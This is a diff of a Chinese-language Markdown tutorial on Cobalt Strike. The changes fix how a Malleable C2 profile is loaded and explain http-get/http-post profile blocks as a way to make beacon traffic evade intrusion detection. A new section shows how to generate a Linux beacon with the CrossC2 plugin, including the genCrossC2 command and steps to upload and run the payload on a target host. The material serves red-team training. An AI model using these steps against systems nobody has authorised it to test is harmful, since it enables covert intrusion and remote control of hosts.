@@ -89,7 +89,7 @@ Cobalt Strike 一款GUI的框架式渗透工具，集成了端口转发、服务
 
 为新建的区域增添A记录, 如下图所示步骤依次添加CS服务器及代理服务器
 
-- CS服务器: 别名为`team`, ip地址为`192.168.47.134`
+- CS服务器: 别名为`CS`, ip地址为`192.168.47.134`
 
 - 代理服务器1: 别名为`proxy1`, ip地址为`192.168.47.131`
 - 代理服务器2: 别名为`proxy2`, ip地址为`192.168.47.140`
@@ -1196,9 +1196,9 @@ Cobalt Strike 是一个流行的渗透测试工具，主要用于模拟高级持
 
 列出指定主机名的共享列表: `net share \\[主机名]`	
 
-![image-20221011000036372](CobaltStrike的使用教程/image-20221011000036372.png)		
+![image-20221011000036372](CobaltStrike的使用教程/image-20221011000036372.png)
 
-
+​		
 
 ## 获取域内用户和管理员信息
 
@@ -1306,10 +1306,10 @@ profile文件编写完成后，可使用CobaltStrike自带的c2lint来验证prof
 
 ### 3.加载Profile文件
 
-在启动Cobalt Strike team server时，需要指定使用的Malleable C2 profile文件。可以在命令行中使用`-profiles`参数来指定文件路径，如下所示：
+在启动Cobalt Strike team server时，可执行如下命令指定Malleable C2 profile文件
 
 ```
-./teamserver [yourip] [password] -profiles myprofile.profile
+./teamserver [yourip] [password] ./myprofile.profile
 ```
 
 其中，[yourip]和[password]是你的C2服务器的IP地址和密码，myprofile.profile是你的Malleable C2 profile文件的路径
@@ -1400,6 +1400,8 @@ server {
 
 ### http-get	
 
+这部分配置信标发送到服务器的 HTTP GET 请求。这通常用于信标的 "check-in" 操作，即信标定期联系服务器以获取指令。`http-get` 配置可以包括请求的URI、请求头、请求参数等，以及服务器响应中应该包含的数据。这使得通信看起来像是正常的网络流量，帮助信标躲避入侵检测系统的侦测
+
 如下代码定义了CS的HTTP GET请求的配置，分为两部分，`client`部分描述了Beacon发出的请求，`server`部分描述了C2服务器的响应
 
 在`metadata`块中，`base64url`表示Beacon将元数据进行Base64编码；`prepend "__cfduid="`表示在编码后的元数据前添加字符串`"__cfduid="`；`header "Cookie";`表示将元数据放入"Cookie"头部字段发送
@@ -1450,6 +1452,8 @@ http-get {
 
 
 ### http-post
+
+这部分配置信标发送到服务器的 HTTP POST 请求。信标使用 POST 请求来发送数据回 C2 服务器，例如搜集到的信息、命令执行结果等
 
 与http-get不同的是，http-post多了个id参数，id部分定义了如何传输session id
 
@@ -1817,8 +1821,6 @@ post-ex {
 - https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-c2-ji-ben-yu-fa
 
 - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482837
-
-
 
 
 
@@ -3013,6 +3015,103 @@ void go(char* buff, int len) {
 - https://www.anquanke.com/post/id/220456
 
 
+
+# 十四、Cross2 Linux Shell
+
+## 前言
+
+CobaltStrike本身并不支持生成linux类型的payload，此处我们需要借用[CrossC2](https://github.com/gloxec/CrossC2)插件来生成，此插件目前仅支持HTTPS监听
+
+我们可以在不同平台下使用CrossC2来生成payload
+
+![image-20231214165312243](CobaltStrike的使用教程/image-20231214165312243.png)
+
+
+
+## 步骤演示
+
+### 1.下载CrossC2
+
+此处我以在windows平台生成payload为例，首先在CobaltStrike目录新建一个CrossC2目录，并将`.cobaltstrike.beacon_keys`和CrossC2插件放进去，再将`genCrossC2.Win.zip`的文件解压至此目录
+
+![image-20231214165932408](CobaltStrike的使用教程/image-20231214165932408.png)
+
+
+
+### 2.修改插件并加载
+
+修改`CrossC2.cna`的内容，将`$CC2_PATH`的值修改为CrossC2的根目录
+
+```
+$CC2_PATH = "E:\\HackerTools\\IntranetPenetration\\CobaltStrike\\CobaltStrike4.9\\CrossC2\\"; # <-------- fix
+$CC2_BIN = "genCrossC2.exe";
+```
+
+
+
+在CobaltStrike客户端加载CrossC2插件
+
+<img src="CobaltStrike的使用教程/image-20231214170437779.png" alt="image-20231214170437779" style="zoom:67%;" />	
+
+
+
+### 3.创建HTTPS监听
+
+创建一个HTTPS类型的监听
+
+<img src="CobaltStrike的使用教程/image-20231214170553405.png" alt="image-20231214170553405" style="zoom: 80%;" />	
+
+
+
+点击右上角的CrossC2插件，创建一个反向HTTPS监听
+
+![image-20231214170655371](CobaltStrike的使用教程/image-20231214170655371.png)
+
+
+
+Listener要选择之前创建的HTTPS监听；由于我teamserver启动时指定了profile文件,因此此处也需指定；CS版本虽然只有小于或等于4.8的版本可选择,但是实测4.9也是可以用的
+
+![image-20231214172041962](CobaltStrike的使用教程/image-20231214172041962.png)
+
+
+
+### 4.生成payload
+
+点击build后会在CobaltStrike根目录下生成一个`beacon.out`
+
+<img src="CobaltStrike的使用教程/image-20231214172410952.png" alt="image-20231214172410952" style="zoom:67%;" />	
+
+
+
+除了在插件生成payload, 还可以在linux或windows使用命令行来生成, Linux的这里就不演示了，命令行格式为如下所示：
+
+```
+genCrossC2 <listener-ip/domain> <listener-port> <beacon_keys> <rebind_library;config.ini;c2profile.profile> <target_platform> <target_arch> <output_file>
+```
+
+如下例子所示:
+
+```
+genCrossC2.exe 192.168.47.188 443 .cobaltstrike.beacon_keys ";;henry.profile" Linux x64 beacon.out
+```
+
+![image-20231214204548405](CobaltStrike的使用教程/image-20231214204548405.png)
+
+
+
+### 5.执行payload
+
+将生成的beacon.out上传至linux主机并赋予可执行权限, 随后执行
+
+![image-20231214172744322](CobaltStrike的使用教程/image-20231214172744322.png)	
+
+
+
+beacon执行后，CobaltStrike显示目标主机上线
+
+![image-20231214173111039](CobaltStrike的使用教程/image-20231214173111039.png)
+
+​				
 
 # vps搭建可能遇到的问题
 
